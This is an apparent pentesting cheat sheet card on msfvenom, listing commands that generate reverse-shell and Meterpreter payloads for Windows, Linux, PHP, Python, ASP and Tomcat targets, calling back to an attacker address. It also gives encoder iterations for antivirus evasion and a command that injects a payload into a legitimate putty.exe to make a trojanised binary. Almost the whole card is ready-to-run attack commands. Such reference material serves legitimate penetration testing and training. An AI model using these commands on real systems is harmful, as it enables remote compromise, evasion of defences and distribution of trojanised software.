---
type: tool
category: payload-generation
tags: [msfvenom, payload, reverse-shell, encoder, av-bypass]
source: teamghsoftware/security-cheatsheets
---

## What it is
msfvenom generates standalone Metasploit payloads (reverse shells, bind shells, stagers) in any format — exe, elf, php, python, raw shellcode, etc. Replaces the old msfpayload + msfencode tools.

## Syntax

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>
```

## Common payloads

```bash
# Windows — reverse TCP Meterpreter (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 -f exe -o shell.exe

# Linux — reverse TCP shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.x LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.16.x LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=10.10.16.x LPORT=4444 -f raw

# ASP reverse shell (IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 -f asp -o shell.asp

# War file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.x LPORT=4444 -f war -o shell.war
```

## Encoding (basic AV bypass)

```bash
# Encode with shikata_ga_nai, 5 iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe

# Remove bad characters (e.g. null byte)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 \
  -b '\x00' -f exe -o clean_shell.exe
```

## Using a template (inject into legit binary)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 \
  -x putty.exe -f exe -o evil_putty.exe
```

## Useful flags

| Flag | Meaning |
|------|---------|
| `-p` | Payload path |
| `-f` | Output format |
| `-e` | Encoder |
| `-i` | Encode iterations |
| `-b` | Bad characters to avoid |
| `-x` | Template executable |
| `-o` | Output file |
| `-l payloads` | List all available payloads |
| `-l encoders` | List all encoders |
| `--payload-options` | Show options for a specific payload |

## Related
- [[metasploit]]
- [[meterpreter]]
- [[Reverse Shell Cheatsheet]]
